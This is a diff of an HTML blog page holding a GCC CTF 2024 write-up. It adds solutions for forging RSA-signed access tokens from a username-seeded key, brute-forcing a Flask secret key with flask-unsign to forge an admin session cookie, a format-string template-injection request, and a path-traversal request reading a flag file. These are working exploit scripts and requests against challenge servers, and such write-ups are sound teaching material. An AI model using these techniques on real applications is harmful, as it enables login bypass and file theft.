@@ -55,7 +55,8 @@
   
   
   <meta name="description" content="Cryptography Too Many Leaks *(39 Solves, 397 Points) A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.
-The Problem The following python script and output text files were given. The problematic part of the code is shown below.
+The Problem The following python script and output text files were given. 
+The problematic part of the code is shown below.
 # What ?! mask = ((1 &lt;&lt; 256) - 1 &lt;&lt; 256) &#43; (1 &lt;&lt; 255) r1 = s &amp; mask print(f&#34;{r1=}&#34;) This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob." />
   <meta name="author" content="Berlian Gabriel" />
   
@@ -116,16 +117,18 @@ The Problem The following python script and output text files were given. The pr
   
   <meta itemprop="name" content="GCC CTF 2024 Write-up">
 <meta itemprop="description" content="Cryptography Too Many Leaks *(39 Solves, 397 Points) A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.
-The Problem The following python script and output text files were given. The problematic part of the code is shown below.
+The Problem The following python script and output text files were given. 
+The problematic part of the code is shown below.
 # What ?! mask = ((1 &lt;&lt; 256) - 1 &lt;&lt; 256) &#43; (1 &lt;&lt; 255) r1 = s &amp; mask print(f&#34;{r1=}&#34;) This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob."><meta itemprop="datePublished" content="2024-03-04T03:12:54+08:00" />
 <meta itemprop="dateModified" content="2024-03-04T03:12:54+08:00" />
-<meta itemprop="wordCount" content="616">
+<meta itemprop="wordCount" content="1475">
 <meta itemprop="keywords" content="" />
   
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="GCC CTF 2024 Write-up"/>
 <meta name="twitter:description" content="Cryptography Too Many Leaks *(39 Solves, 397 Points) A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.
-The Problem The following python script and output text files were given. The problematic part of the code is shown below.
+The Problem The following python script and output text files were given. 
+The problematic part of the code is shown below.
 # What ?! mask = ((1 &lt;&lt; 256) - 1 &lt;&lt; 256) &#43; (1 &lt;&lt; 255) r1 = s &amp; mask print(f&#34;{r1=}&#34;) This is a masking operation which will reveal a certain part of the shared secret between Alice and Bob."/>
 
   
@@ -281,7 +284,9 @@ The Problem The following python script and output text files were given. The pr
 <code>A Hidden Number Problem attack using LLL algorithm to recover Diffie-Hellman shared secret from the leak of its most significant bits.</code></p>
 <p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/header-DH.png?raw=true" alt=""></p>
 <h3 id="the-problem">The Problem</h3>
-<p>The following python <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/too-many-leaks.py">script</a> and output <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/too-many-leaks.txt">text</a> files were given. The problematic part of the code is shown below.</p>
+<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/too-many-leaks.py">python script</a> and <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/too-many-leaks.txt">output text</a> files were given.
+<br/></p>
+<p>The problematic part of the code is shown below.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># What ?!</span>
 mask <span style="color:#f92672">=</span> ((<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">256</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">256</span>) <span style="color:#f92672">+</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">255</span>)
 r1 <span style="color:#f92672">=</span> s <span style="color:#f92672">&amp;</span> mask
@@ -342,8 +347,11 @@ print(unpad(cipher<span style="color:#f92672">.</span>decrypt(bytes<span style="
 <p><em><strong>FLAG: <code>GCC{D1ff13_H3llm4n_L34k_15_FUn!!}</code></strong></em>
 <br/></p>
 <h2 id="gcc-news">GCC News</h2>
+<p><code>Reproducable private key due to user-controlled seed, leading to Access Token forgery</code></p>
 <h3 id="the-problem-1">The Problem</h3>
-<p>The following python <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/gcc-news.py">script</a> was given. The problematic part of the is shown below.</p>
+<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/gcc-news.py">python script</a> was given.
+<br/></p>
+<p>The problematic part of the is shown below.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>(username):
     
 	length <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : len(bin(x)[<span style="color:#ae81ff">2</span>:])
@@ -352,16 +360,189 @@ print(unpad(cipher<span style="color:#f92672">.</span>decrypt(bytes<span style="
 
 	random<span style="color:#f92672">.</span>seed(s)
 
-</code></pre></div><p>The seed used to generate the modulus N was generated using username, which is user-controllable. This means attacker can replicate the seed generation and obtain the same modulus N.</p>
+</code></pre></div><p>The seed used to generate the modulus N was generated using username, which is user-controlled. This means attacker can replicate the seed generation and obtain the same modulus N.</p>
 <h3 id="the-solution-1">The Solution</h3>
-<pre tabindex="0"><code>generate_signature(str({'a' : [True]}), private_key)
+<p>By using the same username used for logging in as the seed value, using the script below, the private key for username <code>a</code> and its subscriber token can be generated.</p>
+<p>token-generator.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> hashlib
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> random
+<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, isPrime
+<span style="color:#f92672">import</span> math
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hash_string_sha256</span>(message):
+    message_bytes <span style="color:#f92672">=</span> message<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+    sha256_hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
+    sha256_hash<span style="color:#f92672">.</span>update(message_bytes)
+    hashed_message <span style="color:#f92672">=</span> sha256_hash<span style="color:#f92672">.</span>digest()
+
+    <span style="color:#66d9ef">return</span> int<span style="color:#f92672">.</span>from_bytes(hashed_message, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_private_key</span>(username):
+	length <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : len(bin(x)[<span style="color:#ae81ff">2</span>:])
+	s <span style="color:#f92672">=</span> bytes_to_long(username<span style="color:#f92672">.</span>encode())
+	random<span style="color:#f92672">.</span>seed(s)
+	e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1001</span>
+	phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+	<span style="color:#66d9ef">while</span> math<span style="color:#f92672">.</span>gcd(phi,e) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
+		n <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+		factors <span style="color:#f92672">=</span> []
+		<span style="color:#66d9ef">while</span> length(n) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2048</span>:
+			temp_n <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>getrandbits(<span style="color:#ae81ff">48</span>)
+			<span style="color:#66d9ef">if</span> isPrime(temp_n):
+				n <span style="color:#f92672">*=</span> temp_n
+				factors<span style="color:#f92672">.</span>append(temp_n)
+		phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+		<span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> factors:
+			phi <span style="color:#f92672">*=</span> (f <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+
+	d <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi)
+	<span style="color:#66d9ef">return</span> (n,d)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_signature</span>(message, private_key):
+    n, d <span style="color:#f92672">=</span> private_key
+    hashed_message <span style="color:#f92672">=</span> hash_string_sha256(message)
+    signature <span style="color:#f92672">=</span> pow(hashed_message, d, n)
+    <span style="color:#66d9ef">return</span> signature
+
+msg <span style="color:#f92672">=</span> str({<span style="color:#e6db74">&#39;a&#39;</span> : [<span style="color:#66d9ef">True</span>]})
+private_key <span style="color:#f92672">=</span> generate_private_key(<span style="color:#e6db74">&#39;a&#39;</span>)
+signature <span style="color:#f92672">=</span> generate_signature(msg, private_key)
+
+token <span style="color:#f92672">=</span> str(signature)
+message <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(msg<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+print(token)
+print(message)
+
+</code></pre></div><p>Append the token and message value as query parameters to the <code>/news</code> endpoint, for example:</p>
+<pre tabindex="0"><code>GET /news?token=411687187392232667280043351583240962509538124485599722468348536700421735151555946448379094652652625247399081658444636213682686696336913864975979564949711489929214627017199941463251823762554488189572696151893229658546387162901042311649171549787123697625171268915155821602967555177808630578485132095843219143851631448031736194135889218495277418635836302160784356004563722995322296770559351735102722802801233236178453915678233494327356578764296673537414652048395476834466127075458495967712163412744053414393231197339135496136001788925213347009899949480187786736688721140709009032619659863771005034307881023069696174005022&amp;message=eydhJzogW1RydWVdfQ%3d%3d%3D HTTP/1.1
+</code></pre><p><em><strong>FLAG: <code>GCC{f1x3d_533d_d154bl3_r4nd0mn355}</code></strong></em>
+<br/></p>
+<h1 id="web">Web</h1>
+<h2 id="find-the-compass">Find The Compass</h2>
+<p><code>Weak key generation leading to login bypass via session cookie forgery. Server-side Template Injection (SSTI) leading to file reading</code></p>
+<h3 id="the-problem-2">The Problem</h3>
+<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/find-the-compass.zip">zip file</a> was given.
+<br/>
+The key space from generate_key in utils.py is too small and bruteforceable. Once the correct key is obtained, a session cookie can be generated, which bypasses the login.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>() <span style="color:#f92672">-&gt;</span> str:
+    <span style="color:#e6db74">&#34;&#34;&#34;Generate a random key for the Flask secret (I love Python!)&#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([str(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [(int(x) <span style="color:#f92672">^</span> (int(time()) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">^</span> randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>))) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [int(char) <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> str(digits[randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">9</span>)]) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>]]]))<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+ 
+</code></pre></div><p>This part of the code indicates an SSTI vulnerability, because the <code>author</code> and <code>content</code> value is user-controlled, and the htmlTemplate string is being processed with <code>.format(self=self</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Renderer</span>(object):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    Proof of Concept to one day get rid of Jinja2. Who needs Jinja2 ?
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">def</span> __init__(self, coordinates: str):
+        <span style="color:#75715e"># Only a wise administrator can retrieve the coordinates of the compass.</span>
+        self<span style="color:#f92672">.</span>coordinates <span style="color:#f92672">=</span> coordinates
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>(self, author, content):
+        author <span style="color:#f92672">=</span> escape(author)
+        content <span style="color:#f92672">=</span> escape(content)
+        htmlTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;p&gt;&lt;strong&gt;</span><span style="color:#e6db74">{</span>author<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/strong&gt;: </span><span style="color:#e6db74">{</span>content<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/p&gt;&#34;</span>
+        <span style="color:#66d9ef">try</span>:
+            <span style="color:#75715e">#Use escape for XSS protection</span>
+            <span style="color:#66d9ef">return</span> (htmlTemplate<span style="color:#f92672">.</span>format(self<span style="color:#f92672">=</span>self))
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            print(e)
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;An error occured while rendering the reminder.&#34;</span>
+
+</code></pre></div><h3 id="the-solution-2">The Solution</h3>
+<p>Note thath the <code>generate_key</code> function will generate random integers from 0 to 9, 4 times. Each randomization result will then be XOR-ed with <code>(int(time()) % 2</code> (possible value of 0 and 1)  <code>randint(0, 2)</code> (possible value of 0, 1, and 2). This means, the final result of each XOR operations is only between 0 to 11.</p>
+<p>Below is the script to generate all possible keys and store it in a text file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">possible_digits <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>]
+simulated_keys <span style="color:#f92672">=</span> set()
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">simulate_key_generation</span>():
+    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> possible_digits:
+        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> possible_digits:
+            <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> possible_digits:
+                <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> possible_digits:
+                    simulated_keys<span style="color:#f92672">.</span>add((str(a)<span style="color:#f92672">+</span>str(b)<span style="color:#f92672">+</span>str(c)<span style="color:#f92672">+</span>str(d))<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;0&#39;</span>))
+    <span style="color:#66d9ef">return</span> simulated_keys
+
+possible_keys <span style="color:#f92672">=</span> simulate_key_generation()
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;possible_keys.txt&#34;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> file:
+    <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> possible_keys:
+        file<span style="color:#f92672">.</span>write(key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+</code></pre></div><p>Afterwards, <code>flask-unsign</code> can be used to go through the key candidates by checking whether a key can be used to unsign a given cookie. In this case, a session cookie which was retrieved from the HTTP Response was used.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">flask-unsign --unsign --cookie <span style="color:#e6db74">&#34;.eJwNzLkNgDAMAMBdXFPwxE5gGeQvERIKRUKF2B1ugHvgvEpx248KW-az-QD1quqwAS1RLcXZRaJgZkYjCqqEwURUIq0mbmKsYRqzIk3kmVNaZ8TRDAZonfvd_qvc3jq8H8AAIu8.ZeNacQ.IUzAGsrvOpVX3adTsaWkW5Vcn5Q&#34;</span> --wordlist possible_keys.txt --no-literal-eval
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session decodes to: <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;logged_in&#39;</span>: False, <span style="color:#e6db74">&#39;nonce&#39;</span>: <span style="color:#e6db74">&#39;637cd872ebb7b5faa5d664cc654dbbcb769dbedbdac410fc5616efa8892550dd&#39;</span>, <span style="color:#e6db74">&#39;status&#39;</span>: <span style="color:#e6db74">&#39;guest&#39;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting brute-forcer with <span style="color:#ae81ff">8</span> threads..
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found secret key after <span style="color:#ae81ff">3840</span> attempts
+b<span style="color:#e6db74">&#39;01111118&#39;</span>
+</code></pre></div><p>Once the key is obtained, a simple HTTP server with a modified logic to generate a forged session cookie can be setup. The respone from this HTTTP server  will generate a forged session cookie, where <code>logged_in</code> is set to <code>True</code> and <code>status</code> is set to <code>admin</code>, which can be used to bypass login.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, session
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01111118&#39;</span> <span style="color:#75715e">#Change with your own key from flask-unsign</span>
+
+<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    session[<span style="color:#e6db74">&#39;logged_in&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+    session[<span style="color:#e6db74">&#39;status&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
+    session[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
+
+    print(session)
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Session cookie created!&#34;</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</code></pre></div><br/>
+<p>After succesful access to <code>/reminder</code>, the next objective is to exploit SSTI to read flag.txt.
+The following request will trigger the SSTI.</p>
+<pre tabindex="0"><code>POST /reminder HTTP/1.1
+Host: worker02.gcc-ctf.com:12006
+Content-Length: 41
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://worker02.gcc-ctf.com:12006
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJw9zTEOwyAMQNG7eGYABDbkMhXYJqrUECnAVPXuydT1D-9_4XPuu8rr3WGb11ID_eyssIHlUFmQglaHKOysi0TBl5Q5K2FL1kml5q1FpkY15sBemg8YYkkEBsYsc43HKnI8AwNr6NXLof_0uwHqiCcC.ZeNohw.xvKSfagcEPwTsMF4XJQ2IOrQByk
+Connection: close
+
+{&quot;reminder_content&quot;:&quot;{self.coordinates}&quot;}
+</code></pre><p>The return value will be <code>&quot;&lt;p&gt;&lt;strong&gt;Cylabus&lt;/strong&gt;: {self.coordinates}&lt;/p&gt;&quot;.format(self=self)</code>. The <code>self.coordinates</code> will be evaluated which results in reading flag.txt. The flag will be displayed when accessing <code>/panel</code></p>
+<p><em><strong>FLAG: <code>GCC{iThink_we_Sh0ul_sT1cK_t0_Jinj4_and_4v0id_w3ak_KEYS!}</code></strong></em>
+<br/></p>
+<h2 id="frenzy-flask">frenzy flask</h2>
+<p><code>Missing path checking on GET request to retrieve uploaded file causes Local File Inclusion (LFI)</code></p>
+<h3 id="the-problem-3">The Problem</h3>
+<p>The following <a href="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/GCC-CTF-2024/flask-frenzy.zip">zip file</a> was given.
+<br/></p>
+<p>There is path checking function in shared.py.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_path</span>(path: str):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;..&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> path
+
+</code></pre></div><p>However, this path checking function is only called when uploading a file (POST). The absence of path checking when getting a file can be exploited to retrieve the flag via path traversal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@bp_api</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/notes/&lt;path:sessid&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_notes</span>(sessid):
+    session_dir <span style="color:#f92672">=</span> abort_check_session(sessid)
+
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+        <span style="color:#66d9ef">for</span> uploaded_file <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>files:
+            abort_check_path(uploaded_file)
+
+            upload_path <span style="color:#f92672">=</span> session_dir<span style="color:#f92672">.</span>joinpath(uploaded_file)
+            <span style="color:#66d9ef">try</span>:
+                request<span style="color:#f92672">.</span>files[uploaded_file]<span style="color:#f92672">.</span>save(upload_path)
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>:
+                abort(<span style="color:#ae81ff">500</span>)
 
 
+    files_list <span style="color:#f92672">=</span> [str(p<span style="color:#f92672">.</span>name) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> session_dir<span style="color:#f92672">.</span>glob(<span style="color:#e6db74">&#34;*&#34;</span>)]
+    <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>jsonify(files_list)
 
-# Social Media
-Thanks for reading! Follow me on [**Twitter**](https://twitter.com/BerlianGM) and [**LinkedIn**](https://linkedin.com/in/Berlian-Gabriel-Mongkoginta)
-
-</code></pre></section>
+</code></pre></div><h3 id="the-solution-3">The Solution</h3>
+<pre tabindex="0"><code>GET /api/notes/f900db07-da3c-491f-b35c-f1f9a3645f0f/../../../../home/user/flag.txt HTTP/1.1
+</code></pre><p><em><strong>FLAG: <code>GCC{7h3_p47h_7r4v3r541_7r1ck_3v3n_w0rk5_1n_Ru57-e5e1248d41965126a6caea7b4ddd460cd8c5443a}</code></strong></em></p>
+<h1 id="social-media">Social Media</h1>
+<p>Thanks for reading! Follow me on <a href="https://twitter.com/BerlianGM"><strong>Twitter</strong></a> and <a href="https://linkedin.com/in/Berlian-Gabriel-Mongkoginta"><strong>LinkedIn</strong></a></p>
+</section>
 
   
   
